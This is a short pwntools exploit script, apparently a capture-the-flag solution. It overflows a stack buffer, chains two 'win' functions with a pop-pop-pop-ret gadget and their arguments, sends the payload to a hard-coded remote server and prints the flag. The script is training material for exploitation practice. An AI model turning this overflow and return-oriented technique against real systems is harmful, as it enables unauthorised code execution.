from pwn import *
pop3_ret = 0x08048709 #We will pop 3 registers cuz the gadget pop 2 registers at "0x0804870a" the address ends with 0x0a which is "\n" 
					  #and thats a bad char and will corrupt the payload but be careful u have to push 3 args to win1 after

win1 = 0x8048506
win2 = 0x8048567
payload = ""
payload += "A"*42
payload += p32(win1)
payload += p32(pop3_ret)
payload += p32(0xdeadbeef)
payload += p32(0xc0febabe)
payload += p32(0xc0febabe)#that's the 3rd arg useless in win1 function but it has to be here cuz we will pop 3 times one for "0xdeadbeef" and two for "0xc0febabe"*2
payload += p32(win2)
payload += "AAAA"
payload += p32(0x12345678)
payload += p32(0x87654321)

p = remote("3.92.136.78",5010)
p.sendline(payload)
p.recvuntil("day...\n")
flag = p.recvline()
print "flag: ",flag